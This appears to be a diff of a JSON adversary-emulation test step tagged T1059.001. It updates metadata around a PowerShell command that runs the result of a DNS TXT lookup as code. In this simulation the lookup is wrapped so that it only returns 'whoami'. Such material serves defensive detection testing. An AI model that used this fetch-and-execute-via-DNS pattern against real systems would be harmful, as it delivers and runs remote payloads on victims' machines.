@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "5a10acf7-b337-4ff6-86bc-43847df88c9c",
+      "id": "6fbe157c-dee7-40a0-abd7-7c34cc4bad7b",
       "type": "execute-command",
       "data": {
         "command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { \u0026\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]",
@@ -16,8 +16,10 @@
       "elevation_required": false
     }
   ],
+  "flows": [],
   "tags": [
     "T1059",
     "T1059.001"
-  ]
+  ],
+  "input_arguments": null
 }
